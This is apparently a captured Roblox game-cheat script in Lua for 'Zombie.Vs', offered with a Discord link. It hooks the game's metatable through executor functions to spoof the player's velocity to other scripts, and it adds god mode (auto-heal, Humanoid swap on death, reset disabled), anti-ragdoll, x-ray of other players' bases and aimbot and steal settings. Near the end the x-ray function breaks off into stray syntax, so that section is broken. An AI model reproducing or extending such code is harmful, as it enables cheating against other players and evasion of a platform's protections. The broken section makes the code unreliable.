-- [[ ==================================================== ]]
-- [[ File captured by: old fuck ]]
-- [[ Discord: https://discord.gg/6ECbbxYsx ]]
-- [[ Type: SOURCE_CODE ]]
-- [[ TIMESTAMP: 23:42:22 ]]
-- [[ ==================================================== ]]

 function _w(t) t = t or 0.03 if task and type(task.wait) == "function" then task.wait(t) elseif type(wait) == "function" then wait(t) end end do local n = 0 while n < 200 do local ok, loaded; do local __m = {pcall(function() return game:IsLoaded() end)}; ok = __m[1]; loaded = __m[2]; end if ok and loaded then break end n = n + 1; _w(0.05) end end
_w(0.1); print("[Zombie.Vs] Starting...");  Players = game:GetService("Players");  RunService = game:GetService("RunService");  UIS = game:GetService("UserInputService");  TS = game:GetService("TweenService");  Lighting = game:GetService("Lighting");  HS = game:GetService("HttpService");  LP = Players.LocalPlayer if not LP then local ok, plr; do local __m = {pcall(function() return Players:WaitForChild("LocalPlayer", 15) end)}; ok = __m[1]; plr = __m[2]; end if ok then LP = plr end end if not LP then warn("[Zombie.Vs] LocalPlayer not found - abort") return end  _genv = _G pcall(function()
if type(getgenv) == "function" then local g = getgenv() if type(g) == "table" then _genv = g end end end)  function destroyOldGuis() local names = {"ZombieVSHub", "CursedHub", "VersincMobileButtons", "VersicnIntro", "BrainrotEnterIntro", "ZombieVSInfoBar"}; local parents = {} pcall(function() table.insert(parents, game:GetService("CoreGui")) end) pcall(function() if LP then table.insert(parents, LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 2)) end end) pcall(function() if type(gethui) == "function" then table.insert(parents, gethui()) end end) for _, parent in ipairs(parents) do if parent then
for _, name in ipairs(names) do pcall(function() local o = parent:FindFirstChild(name) while o do o:Destroy(); o = parent:FindFirstChild(name) end end) end end end _G.VersincMobileButtonRefs = {} end if _genv.__ZombieVSHubLoaded then pcall(destroyOldGuis); _genv.__ZombieVSHubLoaded = false warn("[Zombie.Vs] Old instance cleaned - reloading...") end pcall(destroyOldGuis); _G.__AntiTPBatEnabled = false
-- Anti-TP Bat removed; compatibility stub prevents stale config/keybinds from activating it.
AntiTPBat = { mode = "v1", enabled = false, set = function() return false end, setMode = function() return "v1" end, isOn = function() return false end, toggle = function() return false end, stop = function() end, setupChar = function() end }
  getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons) or nil;  _IS_MOBILE = false pcall(function() _IS_MOBILE = UIS.TouchEnabled == true and UIS.KeyboardEnabled ~= true end) pcall(function() if UIS.TouchEnabled and not UIS.MouseEnabled then _IS_MOBILE = true end end)  function _perfEveryN(nMobile, nDesktop) local n = _IS_MOBILE and nMobile or nDesktop if n <= 1 then return true end local bucket = math.floor(os.clock() * 60)
return (bucket % n) == 0 end  function _perfDue(key, mobileSec, desktopSec) return _perfEveryN(math.max(1, math.floor((mobileSec or 0.1) * 60)), math.max(1, math.floor((desktopSec or 0.05) * 60))) end  S = { mvpBypassSpeed = 55, NS = 59.5, CS = 28.8, LAGGER_SPEED = 24.5, LAGGER_CARRY_SPEED = 15, speedMode = false, antiRagdollEnabled = false, ragdollStealEnabled = false, antiRagdollMode = 1, aimbotMode = 1, antiBatBypassEnabled = false, autoBatV2Enabled = false, laggerToggled = false, laggerPhase = 0, autoCarrySpeedEnabled = false, setAutoCarrySpeedVisual = nil, _autoCarryFromSteal = false, _autoCarryWaitingPickup = false,
_autoCarryGraceUntil = 0, _autoCarryPickupUntil = 0, _autoCarryReturnMode = nil, _stealAttrWasActive = false, medusaCounterEnabled = false, medusaResetEnabled = false, batCounterEnabled = false, unwalkEnabled = false, medusaDebounce = false, medusaLastUsed = 0, dropActive = false, autoLeftEnabled = false, autoRightEnabled = false, autoLeftSetVisual = nil, autoRightSetVisual = nil, speedLabel = nil, autoBatEnabled = false, autoSwingEnabled = true, informationE01Enabled = true, autoBatSetVisual = nil, autoBatEquippedThisRun = false, _autoBatTarget = nil, _autoBatLastScan = 0, resetAutoBatMotion = nil,
AUTO_BAT_SPEED = 58, AUTO_BAT_VERT_SPEED = 52, AUTO_BAT_DIST = -2.8, AUTO_BAT_HEIGHT = 4.75, AUTO_BAT_V_OFF = 1, AUTO_BAT_TURN_SPEED = 285, AUTO_BAT_MAX_TURN_RATE = 28, setBatCounterVisual = nil, startBatCounter = nil, stopBatCounter = nil, enableAutoBat = nil, disableAutoBat = nil, antiLagEnabled = false, removeAccessoriesEnabled = false, motionBlurEnabled = false, xrayBasesEnabled = false, xrayBrainrotsEnabled = false, antiDieEnabled = false, antiFlingShieldEnabled = false, duelsAntiDropEnabled = false, mysteryAntiBatEnabled = false, antiLagDescConn = nil, stretchRezEnabled = false, stretchRezConn = nil, setStretchRezVisual = nil, unwalkSavedAnimate = nil,
_anyKeyListening = false, autoTPEnabled = false, autoTPHeight = 20, autoTPConn = nil, setAutoTPVisual = nil, autoSaveEnabled = true, _lastSaveOk = false, _lastSaveAt = 0, cursedResetRemote = nil, CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42", AntiRagdollConns = {}, noPlayerCollisionEnabled = false, safeModeEnabled = false, autoResetOnMedEnabled = false, showTracerEnabled = false, ragdollCountdownEnabled = false, guiLocked = false, hideMobileButtons = false, lockMobileButtons = false, allLockButtons = false, moveButtons = false, circleButtons = false, progressBarScale = 100, infJumpMode = "hold",
mirrorTPDownEnabled = false, _bodyLockPausedByCombat = false, _bodyLockWanted = false, _bodyLockPausedByBrainrot = false, mobileButtonScale = 0.70, keyboardOverlayEnabled = false, customToolsEnabled = false, rainbowToolsEnabled = false, transparentToolsEnabled = false, customSoundsEnabled = false, customToolSkinBat = "DiamondSword", customToolSkinMedusa = "GoldenDesertEagle", }  VS, UI, F = {}, {}, {}  NS, CS = S.NS, S.CS; CONFIG_FILE, CONFIG_FILE_LEGACY = "ZombieVSHubConfig.json", "cursedPC.json"  _isfile = isfile or (syn and syn.isfile) or function(f) local ok,r=pcall(function() return readfile(f) end) return ok end  _readfile = readfile or (syn and syn.readfile) or function() return nil end
 _writefile = writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or nil;  antiRagdollConn = nil;  antiRagdollModeActive = nil;  ragdollConnections = {};  cachedCharData = {};  isBoosting = false;  BOOST_SPEED = 400  AR_DEFAULT_SPEED = 16  function arGetNormalSpeed() return AR_DEFAULT_SPEED end  function arV2ResetCharacter(char) local hum = char and char:FindFirstChildOfClass("Humanoid"); local root = char and char:FindFirstChild("HumanoidRootPart") if not hum or not root or hum.Health <= 0 then return end pcall(function()
hum:ChangeState(Enum.HumanoidStateType.GettingUp); hum:ChangeState(Enum.HumanoidStateType.Running) root.Velocity = Vector3.zero; root.RotVelocity = Vector3.zero; root.AssemblyLinearVelocity = Vector3.zero; root.AssemblyAngularVelocity = Vector3.zero hum.PlatformStand = false; hum.Sit = false; hum.AutoRotate = true hum.JumpPower = hum.JumpPower > 0 and hum.JumpPower or 50 hum.WalkSpeed = hum.WalkSpeed > 0 and hum.WalkSpeed or AR_DEFAULT_SPEED for _, obj in ipairs(char:GetDescendants()) do if obj:IsA("Motor6D") then obj.Enabled = true
elseif obj:IsA("Constraint") or obj:IsA("BallSocketConstraint") or obj:IsA("HingeConstraint") then obj.Enabled = true elseif obj:IsA("BasePart") then obj.CanCollide = true; obj.AssemblyLinearVelocity = Vector3.zero; obj.AssemblyAngularVelocity = Vector3.zero end end if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = hum end local playerModule = LP:FindFirstChild("PlayerScripts") and LP.PlayerScripts:FindFirstChild("PlayerModule"); local controlModule = playerModule and playerModule:FindFirstChild("ControlModule") if controlModule then
local loaded, module; do local __m = {pcall(require, controlModule)}; loaded = __m[1]; module = __m[2]; end if loaded and module and module.Enable then pcall(function() module:Enable() end) end end end) end  function arCacheCharacterData() local char = LP.Character if not char then return false end local hum = char:FindFirstChildOfClass("Humanoid"); local root = char:FindFirstChild("HumanoidRootPart") if not hum or not root then return false end cachedCharData = { character = char, humanoid = hum, root = root }; S._ragdollCache = cachedCharData return true end  function arDisconnectAll()
for _, conn in ipairs(ragdollConnections) do pcall(function() conn:Disconnect() end) end ragdollConnections = {} end  AR_STATES = { [Enum.HumanoidStateType.Physics] = true, [Enum.HumanoidStateType.Ragdoll] = true, [Enum.HumanoidStateType.FallingDown] = true }  function arIsRagdolled() if not cachedCharData.humanoid then return false end if AR_STATES[cachedCharData.humanoid:GetState()] then return true end local endTime = LP:GetAttribute("RagdollEndTime") return (endTime and (endTime - workspace:GetServerTimeNow()) > 0) or false end  function arForceExitRagdoll()
if not cachedCharData.humanoid or not cachedCharData.root then return end pcall(function() LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow()) end) for _, d in ipairs(cachedCharData.character:GetDescendants()) do if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and tostring(d.Name):find("RagdollAttachment")) then pcall(function() d:Destroy() end) end end if not isBoosting then isBoosting = true pcall(function() cachedCharData.humanoid.WalkSpeed = BOOST_SPEED end) end pcall(function()
if cachedCharData.humanoid.Health > 0 then cachedCharData.humanoid:ChangeState(Enum.HumanoidStateType.Running) end cachedCharData.root.Anchored = false end) end  function arHeartbeatLoop() while antiRagdollModeActive == "v1" do task.wait() local currentlyRagdolled = arIsRagdolled() if currentlyRagdolled then arForceExitRagdoll() elseif isBoosting and not currentlyRagdolled then isBoosting = false if cachedCharData.humanoid then pcall(function() cachedCharData.humanoid.WalkSpeed = AR_DEFAULT_SPEED end) end end end end function F.startAntiRagdoll()
local requestedMode = (S.antiRagdollMode == 2) and "v2" or "v1" if antiRagdollModeActive == requestedMode and (#S.AntiRagdollConns > 0 or antiRagdollConn) then return end F.stopAntiRagdoll() if not arCacheCharacterData() then return end antiRagdollModeActive = requestedMode if requestedMode == "v2" then antiRagdollConn = RunService.Heartbeat:Connect(function() if antiRagdollModeActive ~= "v2" or not S.antiRagdollEnabled then return end local char = LP.Character; local hum = char and char:FindFirstChildOfClass("Humanoid") if not hum then return end local state = hum:GetState()
if AR_STATES[state] or state == Enum.HumanoidStateType.Dead or hum.PlatformStand == true or hum.Sit == true then arV2ResetCharacter(char) end end) table.insert(S.AntiRagdollConns, antiRagdollConn) return end local camConn = RunService.RenderStepped:Connect(function() local cam = workspace.CurrentCamera if cam and cachedCharData.humanoid then cam.CameraSubject = cachedCharData.humanoid end end) table.insert(ragdollConnections, camConn); table.insert(S.AntiRagdollConns, camConn) local respawnConn = LP.CharacterAdded:Connect(function()
isBoosting = false; task.wait(0.5); arCacheCharacterData() end) table.insert(ragdollConnections, respawnConn); table.insert(S.AntiRagdollConns, respawnConn); task.spawn(arHeartbeatLoop) end function F.stopAntiRagdoll() antiRagdollModeActive = nil if antiRagdollConn then pcall(function() antiRagdollConn:Disconnect() end); antiRagdollConn = nil end if isBoosting and cachedCharData.humanoid then pcall(function() cachedCharData.humanoid.WalkSpeed = AR_DEFAULT_SPEED end) end isBoosting = false; arDisconnectAll() for _, conn in pairs(S.AntiRagdollConns) do pcall(function() conn:Disconnect() end) end
S.AntiRagdollConns = {}; cachedCharData = {}; S._ragdollCache = {} end
-- Anti Drop portado do 404 Anti Drop, sem GUI, billboard ou background.
do
local _antiDropMt = nil
local _antiDropOldIndex = nil
local _antiDropOldNewIndex = nil
local _antiDropSpoofedVelocity = Vector3.zero
local _antiDropActive = false
function F.startDuelsAntiDrop()
if _antiDropActive then S.duelsAntiDropEnabled = true; return end
local ok, mt; do local __m = {pcall(getrawmetatable, game)}; ok = __m[1]; mt = __m[2]; end
if not ok or not mt or type(setreadonly) ~= "function" or type(newcclosure) ~= "function" or type(checkcaller) ~= "function" then return end
_antiDropMt = mt
_antiDropOldIndex = mt.__index
_antiDropOldNewIndex = mt.__newindex
local installed = pcall(function()
setreadonly(mt, false)
mt.__index = newcclosure(function(self, key)
if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") and typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and LP.Character and self:IsDescendantOf(LP.Character) then
return _antiDropSpoofedVelocity
end
return _antiDropOldIndex(self, key)
end)
mt.__newindex = newcclosure(function(self, key, value)
if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") and typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and LP.Character and self:IsDescendantOf(LP.Character) then
_antiDropSpoofedVelocity = value
return
end
return _antiDropOldNewIndex(self, key, value)
end)
setreadonly(mt, true)
end)
if installed then _antiDropActive = true; S.duelsAntiDropEnabled = true else pcall(function() setreadonly(mt, true) end) end
end
function F.stopDuelsAntiDrop()
S.duelsAntiDropEnabled = false
if not _antiDropActive then return end
pcall(function()
setreadonly(_antiDropMt, false)
_antiDropMt.__index = _antiDropOldIndex
_antiDropMt.__newindex = _antiDropOldNewIndex
setreadonly(_antiDropMt, true)
end)
_antiDropActive = false
_antiDropMt = nil
_antiDropOldIndex = nil
_antiDropOldNewIndex = nil
end end
-- Anti Bat portado do Mystery.Vs.
do
local _mysteryAntiBatConn = nil
local _mysteryAntiBatSpeed = 10000
local _mysteryAntiBatAngle = 0
local _mysteryAntiBatDirection = 1
local function stopMysteryAntiBat()
if _mysteryAntiBatConn then pcall(function() _mysteryAntiBatConn:Disconnect() end); _mysteryAntiBatConn = nil end
_mysteryAntiBatSpeed = 10000
_mysteryAntiBatAngle = 0
_mysteryAntiBatDirection = 1
_G._AmbitiousAntiBatDesiredXZ = nil
_G._AmbitiousAntiBatSpiking = false
end
local function startMysteryAntiBat()
stopMysteryAntiBat()
_mysteryAntiBatConn = RunService.Heartbeat:Connect(function()
if not S.mysteryAntiBatEnabled then return end
if _G._ZombieAntiBatMovementBlocked then
_G._AmbitiousAntiBatSpiking = false
return
end
local char = LP.Character
local root = char and char:FindFirstChild("HumanoidRootPart")
if not root or not root.Parent then return end
local origXZ = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)
_mysteryAntiBatSpeed = _mysteryAntiBatSpeed + (50 * _mysteryAntiBatDirection)
if _mysteryAntiBatSpeed >= 20000 then _mysteryAntiBatSpeed = 20000; _mysteryAntiBatDirection = -1
elseif _mysteryAntiBatSpeed <= 10000 then _mysteryAntiBatSpeed = 10000; _mysteryAntiBatDirection = 1 end
_mysteryAntiBatAngle = _mysteryAntiBatAngle + (math.random() * 0.5)
local radius = _mysteryAntiBatSpeed + math.random(-5000, 5000)
local newX = math.cos(_mysteryAntiBatAngle) * radius
local newZ = math.sin(_mysteryAntiBatAngle) * radius
_G._AmbitiousAntiBatSpiking = true
root.Velocity = Vector3.new(newX, root.Velocity.Y, newZ)
RunService.RenderStepped:Wait()
if root.Parent then
local wanted = _G._AmbitiousAntiBatDesiredXZ
if wanted then root.Velocity = Vector3.new(wanted.X, root.Velocity.Y, wanted.Z)
else root.Velocity = Vector3.new(origXZ.X, root.Velocity.Y, origXZ.Z) end
end
_G._AmbitiousAntiBatSpiking = false
end)
end
function F.setMysteryAntiBat(on)
S.mysteryAntiBatEnabled = on == true
if S.mysteryAntiBatEnabled then startMysteryAntiBat() else stopMysteryAntiBat() end
end
function F.startMysteryAntiBat() F.setMysteryAntiBat(true) end
function F.stopMysteryAntiBat() F.setMysteryAntiBat(false) end

LP.CharacterAdded:Connect(function()
if S.mysteryAntiBatEnabled then task.wait(0.1); pcall(startMysteryAntiBat) else pcall(stopMysteryAntiBat) end
end)
end
 _adDeathConns = {};  _adHeartConn = nil;  _adCharConn = nil;  _afsLoop = nil  _antiDie = { loop = nil, healthConn = nil, diedConn = nil, humanoid = nil, lastHealTime = 0, invincibleUntil = 0, config = { healthThreshold = 50, invincibilityFrames = 0.75, ragdollProtection = true, autoRevive = true }, }  function _adDisconnectHumanoid() if _antiDie.healthConn then pcall(function() _antiDie.healthConn:Disconnect() end); _antiDie.healthConn = nil end
if _antiDie.diedConn then pcall(function() _antiDie.diedConn:Disconnect() end); _antiDie.diedConn = nil end _antiDie.humanoid = nil end  function _adDisconnectAll() for _, c in ipairs(_adDeathConns) do pcall(function() c:Disconnect() end) end _adDeathConns = {} if _adHeartConn then pcall(function() _adHeartConn:Disconnect() end); _adHeartConn = nil end _adDisconnectHumanoid() end  function _adSuperHeal(hum) if not hum or not hum.Parent then return end local maxHealth = hum.MaxHealth or 100 if maxHealth <= 0 or maxHealth == math.huge then maxHealth = 100 end pcall(function()
hum.Health = maxHealth if hum.MaxHealth < maxHealth then hum.MaxHealth = maxHealth end end) _antiDie.invincibleUntil = tick() + (_antiDie.config.invincibilityFrames or 0.75) _antiDie.lastHealTime = tick() pcall(function() local char = hum.Parent if not char then return end for _, child in ipairs(char:GetChildren()) do if child:IsA("NumberValue") then local name = child.Name:lower() if name:find("health") or name:find("hp") or name:find("life") then child.Value = maxHealth end end if child:IsA("BoolValue") and child.Name:lower():find("dead") then child.Value = false end end end) end
 function _adPreventDamage(root, hum) if not hum then return end if hum.Health < (hum.MaxHealth or 100) then _adSuperHeal(hum) end if tick() < (_antiDie.invincibleUntil or 0) then if hum.Health < (hum.MaxHealth or 100) then pcall(function() hum.Health = hum.MaxHealth or 100 end) end end if _antiDie.config.ragdollProtection then local state = hum:GetState() if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Dead then pcall(function()
hum:ChangeState(Enum.HumanoidStateType.GettingUp) hum:ChangeState(Enum.HumanoidStateType.Running) end) _adSuperHeal(hum) if root then pcall(function() root.AssemblyAngularVelocity = Vector3.zero root.AssemblyLinearVelocity = Vector3.new( root.AssemblyLinearVelocity.X, math.max(root.AssemblyLinearVelocity.Y, -10), root.AssemblyLinearVelocity.Z ) end) end end end if hum.Health <= 0 then _adSuperHeal(hum) pcall(function() hum.PlatformStand = false hum.Sit = false hum:ChangeState(Enum.HumanoidStateType.GettingUp) end) end end function F.applyAntiReset()
pcall(function() game:GetService("StarterGui"):SetCore("ResetButtonCallback", false) end) end function F.restoreReset() pcall(function() game:GetService("StarterGui"):SetCore("ResetButtonCallback", true) end) end  function protectCharClean(char) if not S.antiDieEnabled then return end char = char or LP.Character if not char then return end local hum = char:FindFirstChildOfClass("Humanoid") if not hum then local ok, waited; do local __m = {pcall(function() return char:WaitForChild("Humanoid", 3) end)}; ok = __m[1]; waited = __m[2]; end if ok and waited and waited:IsA("Humanoid") then hum = waited end end
if not hum or not S.antiDieEnabled then return end _adDisconnectHumanoid() _antiDie.humanoid = hum pcall(function() hum.BreakJointsOnDeath = false hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end) _adSuperHeal(hum) _antiDie.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function() if not S.antiDieEnabled or not hum.Parent then return end if hum.Health <= 0 or hum.Health < (_antiDie.config.healthThreshold or 50) then _adSuperHeal(hum) end end) table.insert(_adDeathConns, _antiDie.healthConn) _antiDie.diedConn = hum.Died:Connect(function()
if not S.antiDieEnabled or not char.Parent then return end task.wait() if not S.antiDieEnabled or not char.Parent then return end pcall(function() local newHum = Instance.new("Humanoid") newHum.Name = "ReplacedHumanoid" newHum.BreakJointsOnDeath = false newHum:SetStateEnabled(Enum.HumanoidStateType.Dead, false) local maxH = (hum.MaxHealth and hum.MaxHealth > 0 and hum.MaxHealth ~= math.huge) and hum.MaxHealth or 100 newHum.MaxHealth = maxH newHum.Health = maxH newHum.Parent = char if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = newHum end
if hum.Parent then hum:Destroy() end end) if S.antiDieEnabled then protectCharClean(char) end end) table.insert(_adDeathConns, _antiDie.diedConn) end function F.startAntiDie() S.antiDieEnabled = true _adDisconnectAll() if _antiDie.loop then pcall(function() _antiDie.loop:Disconnect() end); _antiDie.loop = nil end if _adCharConn then pcall(function() _adCharConn:Disconnect() end); _adCharConn = nil end _antiDie.loop = RunService.Heartbeat:Connect(function() if not S.antiDieEnabled then return end local char = LP.Character if not char then return end
local hum = char:FindFirstChildOfClass("Humanoid") local root = char:FindFirstChild("HumanoidRootPart") if not hum then return end _adPreventDamage(root, hum) end) _adHeartConn = _antiDie.loop _adCharConn = LP.CharacterAdded:Connect(function(c) if not S.antiDieEnabled then return end task.defer(function() protectCharClean(c) end)  end) task.defer(function() protectCharClean(LP.Character) end) F.applyAntiReset()  end function F.stopAntiDie() S.antiDieEnabled = false if _antiDie.loop then pcall(function() _antiDie.loop:Disconnect() end); _antiDie.loop = nil end if _adCharConn then pcall(function() _adCharConn:Disconnect() end); _adCharConn = nil end local hum = _antiDie.humanoid _adDisconnectAll() if hum and hum.Parent then pcall(function() hum.BreakJointsOnDeath = true hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true) end) end local char = LP.Character; local chum = char and char:FindFirstChildOfClass("Humanoid")
if chum then pcall(function() chum:SetStateEnabled(Enum.HumanoidStateType.Dead, true) if chum.MaxHealth == math.huge then chum.MaxHealth = 100 end chum.Health = math.min(chum.Health, chum.MaxHealth) if chum.Health <= 0 then chum.Health = chum.MaxHealth end end) end F.restoreReset() end  ANTI_FLING_MAX_LIN = 160  ANTI_FLING_MAX_ANG = 45  ANTI_FLING_AIMBOT_LIN = 220  ANTI_FLING_AIMBOT_ANG = 60  function _antiFlingApply(root, char, maxLin, maxAng) if not root or not root.Parent then return end pcall(function() local v = root.AssemblyLinearVelocity
local horiz = Vector3.new(v.X, 0, v.Z) local hMag = horiz.Magnitude if hMag > maxLin then local scale = maxLin / hMag root.AssemblyLinearVelocity = Vector3.new(v.X * scale, v.Y, v.Z * scale) elseif v.Magnitude > maxLin * 1.35 then root.AssemblyLinearVelocity = v.Unit * maxLin end local av = root.AssemblyAngularVelocity if av.Magnitude > maxAng then root.AssemblyAngularVelocity = Vector3.zero end if char then for _, p in ipairs(char:GetChildren()) do if p:IsA("BasePart") and p ~= root then local pv = p.AssemblyLinearVelocity local ph = Vector3.new(pv.X, 0, pv.Z)
if ph.Magnitude > maxLin * 1.2 then local scale = (maxLin * 1.05) / ph.Magnitude p.AssemblyLinearVelocity = Vector3.new(pv.X * scale, pv.Y, pv.Z * scale) end if p.AssemblyAngularVelocity.Magnitude > maxAng then p.AssemblyAngularVelocity = Vector3.zero end end end end end) end function F.startAntiFlingShield() S.antiFlingShieldEnabled = true if _afsLoop then pcall(function() _afsLoop:Disconnect() end); _afsLoop = nil end _afsLoop = RunService.Heartbeat:Connect(function() if not S.antiFlingShieldEnabled then return end local char = LP.Character if not char then return end
local root = char:FindFirstChild("HumanoidRootPart") if not root then return end local aimOn = (S.autoBatEnabled == true) or (tpBatEnabled == true) or (S.antiBatBypassEnabled == true) local maxLin = aimOn and ANTI_FLING_AIMBOT_LIN or ANTI_FLING_MAX_LIN local maxAng = aimOn and ANTI_FLING_AIMBOT_ANG or ANTI_FLING_MAX_ANG _antiFlingApply(root, char, maxLin, maxAng) end) end function F.stopAntiFlingShield() S.antiFlingShieldEnabled = false if _afsLoop then pcall(function() _afsLoop:Disconnect() end); _afsLoop = nil end end
 removeAccConn = nil;  removeAccChildConn = nil;  removeAccActive = false  function isHatOrHairAccessory(accessory) if not accessory or not accessory:IsA("Accessory") then return false end local accessoryType = nil pcall(function() accessoryType = accessory.AccessoryType end) if accessoryType == Enum.AccessoryType.Hat or accessoryType == Enum.AccessoryType.Hair then return true end for _, item in ipairs(accessory:GetDescendants()) do if item:IsA("Attachment") and (item.Name == "HatAttachment" or item.Name == "HairAttachment") then return true end end
local lowerName = tostring(accessory.Name):lower() return lowerName:find("hair", 1, true) ~= nil or lowerName:find("hat", 1, true) ~= nil end  function removeCharAccessories(char) if not char then return end for _, child in ipairs(char:GetChildren()) do pcall(function() if child:IsA("Accessory") and isHatOrHairAccessory(child) then child:Destroy() end end) end end function F.startRemoveAccessories() removeAccActive = true; S.removeAccessoriesEnabled = true local function bindCharacter(char) if removeAccChildConn then removeAccChildConn:Disconnect(); removeAccChildConn = nil end
removeCharAccessories(char) if char then removeAccChildConn = char.ChildAdded:Connect(function(child) if not removeAccActive or not child:IsA("Accessory") then return end task.defer(function() if child.Parent == char then removeCharAccessories(char) end end) end) end end bindCharacter(LP.Character) if removeAccConn then removeAccConn:Disconnect() end removeAccConn = LP.CharacterAdded:Connect(function(char) task.wait(0.15) bindCharacter(char) end) end function F.stopRemoveAccessories() removeAccActive = false; S.removeAccessoriesEnabled = false
if removeAccConn then removeAccConn:Disconnect(); removeAccConn = nil end if removeAccChildConn then removeAccChildConn:Disconnect(); removeAccChildConn = nil end end

-- MOTION BLUR + X-RAY BASES + X-RAY BRAINROTS (ported from Zombie.vs Mobile v2 v6)
do
    local motion = { conn = nil, effect = nil, current = 0 }
    local bases = { folders = {"Base", "PlotSign", "FriendPanel", "Cash", "Laser", "Decorations", "Skin", "Unlock", "Purchases"}, saved = {}, conns = {}, generation = 0 }
    local brainrots = { saved = {}, conns = {}, names = nil, generation = 0 }

    local function disconnectAll(list)
        for _, conn in ipairs(list) do pcall(function() conn:Disconnect() end) end
        table.clear(list)
    end

    function F.setMotionBlur(on)
        S.motionBlurEnabled = on == true
        if motion.conn then pcall(function() motion.conn:Disconnect() end); motion.conn = nil end
        if not S.motionBlurEnabled then
            if motion.effect and motion.effect.Parent then motion.effect.Size = 0; motion.effect.Enabled = false end
            motion.current = 0
            return
        end
        motion.effect = Lighting:FindFirstChild("ZombieVsMotionBlur")
        if not motion.effect or not motion.effect:IsA("BlurEffect") then
            motion.effect = Instance.new("BlurEffect")
            motion.effect.Name = "ZombieVsMotionBlur"
            motion.effect.Parent = Lighting
        end
        motion.effect.Size = 0; motion.effect.Enabled = true; motion.current = 0
        local camera = workspace.CurrentCamera
        if not camera then return end
        local lastCFrame = camera.CFrame
        motion.conn = RunService.RenderStepped:Connect(function(dt)
            if not S.motionBlurEnabled then return end
            local cam = workspace.CurrentCamera
            if not cam then return end
            local current = cam.CFrame
            local angle = math.deg(math.acos(math.clamp(current.LookVector:Dot(lastCFrame.LookVector), -1, 1)))
            local target = math.min(angle * 20, 7)
            motion.current = motion.current + (target - motion.current) * math.min(1, dt * 10)
            if motion.effect and motion.effect.Parent then motion.effect.Size = motion.current end
            lastCFrame = current
        end)
    end

    local function applyBaseObject(obj, alpha, generation)
        if not obj or generation ~= bases.generation then return end
        local function apply(item)
            if item:IsA("BasePart") then
                if bases.saved[item] == nil then bases.saved[item] = item.Transparency end
                local original = bases.saved[item]
                if original < 1 then item.Transparency = original + (1 - original) * alpha end
            elseif item:IsA("TextLabel") or item:IsA("TextButton") then
                if bases.saved[item] == nil then bases.saved[item] = {text = item.TextTransparency, bg = item.BackgroundTransparency} end
                local original = bases.saved[item]
                if original.text < 1 then item.TextTransparency = original.text + (1 - original.text) * alpha end
                if original.bg < 1 then item.BackgroundTransparency = original.bg + (1 - original.bg) * alpha end
            elseif item:IsA("Frame") or item:IsA("ScrollingFrame") then
                if bases.saved[item] == nil then bases.saved[item] = item.BackgroundTransparency end
                local original = bases.saved[item]
                if original < 1 then item.BackgroundTransparency = original + (1 - original) * alpha end
            elseif item:IsA("ImageLabel") or item:IsA("ImageButton") then
                if bases.saved[item] == nil then bases.saved[item] = {image = item.ImageTransparency, bg = item.BackgroundTransparency} end
                local original = bases.saved[item]
                if original.image < 1 then item.ImageTransparency = original.image + (1 - original.image) * alpha end
                if original.bg < 1 then item.BackgroundTransparency = original.bg + (1 - original.bg) * alpha end
            end
        end
        apply(obj)
        for index, child in ipairs(obj:GetDescendants()) do
            apply(child)
            if index % 300 == 0 then task.wait(); if generation ~= bases.generation then return end end
        end
    end

    local function trackBase(root, alpha, generation)
        if not root or generation ~= bases.generation then return end
        applyBaseObject(root, alpha, generation)
        if generation ~= bases.generation then return end
        table.insert(bases.conns, root.DescendantAdded:Connect(function(obj)
            if generation == bases.generation then applyBaseObject(obj, alpha, generation) end
        end))
    end

    local function processPlot(plot, alpha, generation)
        if not plot or generation ~= bases.generation then return end
        for _, folderName in ipairs(bases.folders) do trackBase(plot:FindFirstChild(folderName), alpha, generation) end
        table.insert(bases.conns, plot.ChildAdded:Connect(function(child)
            if generation ~= bases.generation then return end
            for _, folderName in ipairs(bases.folders) do
                if child.Name == folderName then trackBase(child, alpha, generation); break end
            end
        end))
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if not podiums then return end
        local function processPodium(podium)
            for _, child in ipairs(podium:GetChildren()) do
                if child.Name == "Claim" then trackBase(child, alpha, generation)
                elseif child.Name == "Base" then trackBase(child:FindFirstChild("Decorations"), alpha, generation)
                elseif child:IsA("Model") and child.Name ~= "Decorations" then trackBase(child, alpha, generation) end
            end
        end
        for _, podium in ipairs(podiums:GetChildren()) do processPodium(podium) end
        table.insert(bases.conns, podiums.ChildAdded:Connect(function(podium)
            task.wait(0.1); if generation == bases.generation then processPodium(podium) end
        end))
    end

    function F.setXRayBases(on)
        S.xrayBasesEnabled = on == true
        disconnectAll(bases.conns); bases.generation = bases.generation + 1
        local generation = bases.generation
        if not S.xrayBasesEnabled then
            local snapshot = bases.saved; bases.saved = {}
            for obj, original in pairs(snapshot) do pcall(function()
                if obj:IsA("BasePart") then obj.Transparency = original
                elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then obj.TextTransparency = original.text; obj.BackgroundTransparency = original.bg
                elseif obj:IsA("Frame") or obj:IsA("ScrollingFrame") then obj.BackgroundTransparency = original
                elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then obj.ImageTransparency = original.image; obj.BackgroundTransparency = original.bg end
            end) end
            return
        end
        )
        end)
    end

    local function loadBrainrotNames()
        if brainrots.names then return end
        brainrots.names = {}
        pcall(function()
            local replicated = game:GetService("ReplicatedStorage")
            local datas = replicated:FindFirstChild("Datas")
            local animals = datas and datas:FindFirstChild("Animals")
            if animals and animals:IsA("ModuleScript") then
                for name in pairs(require(animals)) do brainrots.names[name] = true end
            end
        end)
    end
